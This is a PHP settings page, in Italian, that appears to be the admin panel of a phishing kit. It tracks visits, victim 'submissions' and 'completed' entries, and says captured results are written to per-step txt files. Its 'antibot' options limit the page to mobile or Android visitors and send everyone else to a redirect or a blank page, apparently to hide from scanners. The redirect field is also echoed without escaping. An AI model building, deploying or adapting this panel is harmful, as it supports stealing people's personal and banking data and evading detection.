<?php  /* 1hnn6b5XTp5GzmgWJxRbXtWhgUYJvZKjPtYzJ3zqLQQj */   include("sec.php"); include("datistat.php"); if(isset($_POST['salva'])){ if(isset($_POST['solomobile'])){ $solomobile = true; }else{ $solomobile=false; } if(isset($_POST['soloandroid'])){ $soloandroid = true; }else{ $soloandroid=false; } if(isset($_POST['redirect'])){ $redirect = $_POST['redirect']; }else{ $redirect=false; } if(isset($_POST['norichiedichiamata'])){ $norichiedichiamata = $_POST['norichiedichiamata']; }else{ $norichiedichiamata=false; } $opt=array("solomobile"=>$solomobile,"soloandroid"=>$soloandroid,"redirect"=>$redirect,"norichiedichiamata"=>$norichiedichiamata); $out = json_encode($opt); file_put_contents('opzioni.json', $out); $messsalva="SALVATO"; }else{ $messsalva=""; } include("leggi.php"); ?>
<?php include("layout1.php") ?>
<?php if(nomecartella2()=="pannello2"){ ?>
<P style="padding:20px;text-align:center;color:darkred;"><B>
PER LA TUA SICUREZZA CAMBIA SEMPRE LA PASSWORD DI DEFAULT 123 E IL NOME DEL PANNELLO</B>
</P>

<?php } ?><br>
<div class="container" STYLE="text-align:center">
  <div class="row">
    <div class="col-sm">
    <H5>  VISITE</H5>
    </div>
    <div class="col-sm">
      <H5 style="font-weight:bold" ><?php echo $visite ?></H5>
    </div>
    <div class="col-sm">
    <H5>  INSERIMENTI</H5>
    </div>
    <div class="col-sm">
      <H5  style="font-weight:bold" ><?php echo $inserimenti ?></H5>
    </div>
    <div class="col-sm">
    <H5>  FATTI</H5>
    </div>
    <div class="col-sm">
      <H5 style="font-weight:bold" ><?php echo $fatti ?></H5>
    </div>

  </div>
<HR>
  


</div>

<div class="container" STYLE="text-align:center">
<div class="col-sm"><canvas id="gauge" ></canvas> </div>

 <div class="col-sm">
        <H5 style="font-weight:bold" >Performance</H5>
          <H5 style="font-weight:bold" ><?php echo $rapporto ?>%</H5>
    </div>
</div><HR><p style="padding:20px;text-align:center">
PUOI VEDERE I RISULTATI ANCHE TRAMITE TXT "nomepannello" +step(1).txt ecc.. o uniti su "nomepannello"+_debug.txt
</p>
<HR>
<DIV style="padding:20px;text-align:center">
<form method="POST"> <div class="form-group">
<h4>PAGINA PROTETTA CON ANTIBOT	&reg; - ALTRE IMPOSTAZIONI </H5><HR><BR>
<a class="btn btn-warning" href="cambianome.php">CAMBIA NOME AL PANNELLO</a>

<a class="btn btn-danger" href="cambia.php">CAMBIA PASSWORD</a><BR><BR>


<?php if($messsalva){?><div class="alert alert-success salvato"><?php echo $messsalva ?></div><?php } ?>
<label>PERMETTI LA VISUALIZZAZIONE DELLA PAGINA SOLO DISPOSITIVI MOBILI</label>
<input  class="form-control"  type="checkbox" <?php if($opt['solomobile']) echo "checked" ?> name="solomobile">
<BR>
<label>PERMETTI LA VISUALIZZAZIONE DELLA PAGINA SOLO AGLI ANDROID</label><input  class="form-control"  type="checkbox"  <?php if($opt['soloandroid']) echo "checked" ?>  name="soloandroid">
<BR>
<label>REDIRECT SU LINK (SE VUOTO MOSTRA PAGINA BIANCA)</label><input  class="form-control"  type="url" name="redirect" value="<?php echo $opt['redirect'] ?>">
<BR>
<label>DISATTIVA RICHIEDI CHIAMATA</label><input  class="form-control"  type="checkbox"  <?php if($opt['norichiedichiamata']) echo "checked" ?>  name="norichiedichiamata">
</div>
<button type="submit" class="btn btn-primary" name="salva">SALVA</button>
</form>
</div>
<script>
var opts = {
  angle: -0.01, 
  lineWidth: 0.3, 
  radiusScale: 0.96, 
  pointer: {
    length: 0.59, 
    strokeWidth: 0.049, // The thickness
    color: '#000000' // Fill color
  },
  limitMax: false,    
  limitMin: false,     // If true, the min value of the gauge will be fixed
  colorStart: '#6FADCF',   // Colors
  colorStop: '#8FC0DA',    // just experiment with them
  strokeColor: '#E0E0E0',  // to see which ones work best for you
  generateGradient: true,
  highDpiSupport: true,     // High resolution support
  
};
var target = document.getElementById('gauge'); // your canvas element
var gauge = new Gauge(target).setOptions(opts); // create sexy gauge!
gauge.maxValue = 100; // set max gauge value
gauge.setMinValue(0);  // Prefer setter over gauge.minValue = 0
gauge.animationSpeed = 38; // set animation speed (32 is default value)
gauge.set(<?php echo $rapporto ?>); // set actual value

	window.setTimeout(function () {
 // window.location.reload();
}, 15000);
window.setTimeout(function () {
 jQuery(".salvato").remove()
}, 3000);
</script>
<?php include("layout2.php") ?><?php  ?>